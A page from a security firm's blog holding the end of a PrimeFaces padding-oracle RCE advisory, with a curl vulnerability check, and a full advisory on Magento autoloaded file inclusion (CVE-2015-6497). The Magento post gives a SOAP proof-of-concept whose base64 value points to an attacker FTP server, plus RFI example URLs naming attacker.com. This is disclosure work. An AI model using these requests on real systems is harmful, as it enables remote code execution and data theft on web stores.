-------------------------------------------------------`

To check if the application is vulnerable:

`n0def@n0def-U36SG:~/Desktop/PadBuster-master$

enc="wQR45Hj4OwBRgKBtl5v%2FG4elO1lYWl%2BZfvjy1R79FgJ%2F3H%2BKYopezNVswr9KFx%2B8XaKwW6Tq3bG8OxNcX3CjCO5%2F1SsvFbW8gn6BL38vAt03Pz2scc3fGrGm3Vi7A7wdmqDjIu5mWyXWVXipcGirQgAAAAAAAAAA";

chk="123445456"; curl -X POST

"http://localhost:8085/showcase-5.1/javax.faces.resource/dynamiccontent.properties.xhtml"

-ki -kvvv -d "pfdrt=sc&ln=primefaces&pfdrid=$enc&primesecretchk=$chk"| grep $chk

primesecretchk: 123445456`

`//Note: the previous request will work against all systems vulnerable to PrimeSecret! Since // has been generated on a host with "primefaces" secretKey`

The application is vulnerable because of the new added response header: *"primesecretchk: 123445456"*

### Remediation

Since an official patch is still not available end users and companies can protect their
application by disabling *StreamedContentHandler.java*.

Alternatively by filtering incoming requests with **pfdrid** parameter (value
longer than 16bytes and Base64 encoded) and *"pfdrt=sc"* is possible to mitigate the attack*: "pfdrt=sc"* calls
the vulnerable StreamedContent Method and *pfdrid* contains the exploit payload.

*Isn't enough to change the default "secretKey"?*

Unfortunately not: changing the default secretKey is not enough because of the padding oracle vulnerability issue that in this post has been named *PrimeOracle*.

By

[Giorgio Fedon](https://www.blogger.com/profile/17285473210424014740 "author profile")

at

[9:23 AM](https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html "permanent link")

[17 comments
:](https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=1319215375972964294&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=1319215375972964294&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=1319215375972964294&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=1319215375972964294&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=1319215375972964294&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=1319215375972964294&target=pinterest "Share to Pinterest")

Labels:
[Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
,
[Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
,
[J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
,
[Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
,
[Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
,
[Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

## Friday, September 11, 2015

# [Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

[Older Posts](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution?updated-max=2015-09-11T00:32:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* Remote Code Execution

  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
